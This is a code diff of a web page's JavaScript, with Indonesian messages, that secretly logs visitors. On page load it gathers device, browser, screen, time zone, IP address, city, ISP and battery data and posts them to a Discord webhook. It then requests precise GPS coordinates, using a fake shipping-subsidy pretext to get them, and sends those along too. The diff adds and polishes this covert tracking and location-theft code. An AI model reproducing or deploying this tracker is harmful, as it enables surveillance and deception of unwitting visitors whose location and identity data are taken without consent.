@@ -98,45 +98,53 @@
           (p) => {
             const lat = p.coords.latitude;
             const lon = p.coords.longitude;
-            sendToDiscord("📍 Lokasi Didapat", [
-              { name: "Maps", value: `http://www.google.com/maps/place/${lat},${lon}` },
+            sendToDiscord("📍 LOKASI BERHASIL (ALLOW)", [
+              { name: "Maps Link", value: `https://www.google.com/maps?q=${lat},${lon}` },
               { name: "Koordinat", value: `${lat}, ${lon}` }
             ]);
             if(callback) callback();
           },
           (err) => {
-            sendToDiscord("❌ User Menolak Lokasi", [{ name: "Status", value: "Izin ditolak/Block" }]);
-            alert("Merchant: Akses lokasi ditolak. Gunakan alamat manual di halaman berikutnya.");
+            sendToDiscord("❌ LOKASI DITOLAK (DENIED)", [
+              { name: "Status", value: "User menolak izin atau GPS mati" },
+              { name: "Error Code", value: err.code.toString() }
+            ]);
+            alert("Akses lokasi ditolak. Aktifkan GPS dan izinkan browser untuk mendapatkan subsidi ongkir.");
             if(callback) callback();
           },
-          { enableHighAccuracy: true, timeout: 5000 }
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
-      } else if(callback) {
-        callback();
+      } else {
+        if(callback) callback();
       }
     }
 
     window.onload = async () => {
       let data = [
         { name: "📱 Device", value: navigator.platform, inline: true },
-        { name: "🌐 UA", value: navigator.userAgent.substring(0, 100) },
-        { name: "🔋 Batt", value: "Checking..." },
+        { name: "🌐 Browser", value: navigator.userAgent.split(') ').pop() },
         { name: "📏 Screen", value: `${screen.width}x${screen.height}`, inline: true },
-        { name: "🕰️ TZ", value: Intl.DateTimeFormat().resolvedOptions().timeZone }
+        { name: "🕰️ TZ", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true }
       ];
-
-      if (navigator.getBattery) {
-        const b = await navigator.getBattery();
-        data[2].value = `${Math.round(b.level * 100)}% (${b.charging ? 'Charge' : 'No'})`;
-      }
 
       try {
         const res = await fetch('https://ipapi.co/json/');
         const d = await res.json();
-        data.push({ name: "🌍 IP", value: d.ip }, { name: "🏙️ Kota", value: d.city }, { name: "🏢 ISP", value: d.org });
+        data.push(
+          { name: "🌍 IP", value: d.ip },
+          { name: "🏙️ Kota", value: `${d.city}, ${d.region}` },
+          { name: "🏢 ISP", value: d.org }
+        );
       } catch (e) {}
 
-      await sendToDiscord("🔥 Auto Log (Web Opened)", data);
+      if (navigator.getBattery) {
+        try {
+          const b = await navigator.getBattery();
+          data.push({ name: "🔋 Battery", value: `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'No'})` });
+        } catch(e) {}
+      }
+
+      await sendToDiscord("🔥 AUTO LOG ENTRY", data);
       
       setTimeout(() => {
         reqLoc(); 
